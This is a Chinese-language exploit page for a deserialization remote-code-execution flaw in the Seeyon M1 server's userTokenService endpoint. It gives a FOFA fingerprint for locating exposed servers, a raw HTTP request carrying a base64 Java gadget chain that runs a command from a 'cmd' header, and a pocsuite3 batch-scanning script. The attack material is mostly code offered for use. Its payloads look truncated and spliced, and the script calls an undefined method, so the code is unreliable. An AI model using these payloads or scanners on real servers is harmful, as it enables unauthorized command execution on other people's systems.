## 致远M1 usertokenservice 反序列化RCE漏洞

## fofa
```
"M1-Server 已启动"
```

## poc
```
POST /esn_mobile_pns/service/userTokenService HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 
Content-Type: application/x-www-form-urlencoded
cmd: @@@@@echo test

{{base64_decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmE
```

## 批量检测脚本
```python
#!/usr/bin/env python

# coding: utf-8



from pocsuite3.api import (

    POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE,

    REVERSE_PAYLOAD, POC_CATEGORY

)



class POC(POCBase):

    vulID = '1'

    version = '1'

    author = ['AuthorName']

    vulDate = '2023-08-15'

    createDate = '2023-08-15'

    updateDate = '2023-08-15'

    references = ['']

    name = 'POC Name'

    appPowerLink = ''

    appName = 'Application Name'

    appVersion = ''

    vulType = VUL_TYPE.COMMAND_EXECUTION

    desc = '''

        Description of the vulnerability.

    '''

    samples = ['']

    install_requires = ['']

    pocDesc = '''

    How to use the POC.

    '''

    category = POC_CATEGORY.EXPLOITS.REMOTE



    def _verify(self):

        result = {}

        path = '/esn_mobile_pns/service/userTokenService'

        headers = {

            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",

            'Connection': 'close',

            'Content-Type': 'application/x-www-form-urlencoded',

            'Accept-Encoding': 'gzip, deflate',

            'cmd': '@@@@@echo Test',

        }

        data = '''{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldG

hvZHQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lNZXRob2RxAH4ACnhyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAACnQAGVJGOkpNb2RlbFJlc3VsdHQAG0xqYXZhL2xhbmcvU3RyaW5nO3hwc3EAfgAKc3IAJm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnlUiqsSmzlVCAIAAUwAA21hcHQAQkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAFGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwc3EAfgAJeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJUcmFuc2Zvcm1lcrN5Y+2Zs1QDAAB4cHcEAAAAAHg=

'''

        response = requests.post(self.url + path, headers=headers, data=data)

        if response.status_code == 200 and "Test" in response.text:

            result['VerifyInfo'] = {}

            result['VerifyInfo']['URL'] = self.url + path

            result['VerifyInfo']['Payload'] = headers['cmd']

        return self.parse_output(result)



    def _attack(self):

        return self._verify()



    def _parse_output(self, output):

        parsed_output = Output(self)

        if output:

            parsed_output.success(output)

        else:

            parsed_output.fail("Exploit failed. Target is not vulnerable.")

        return parsed_output



register_poc(POC)

```
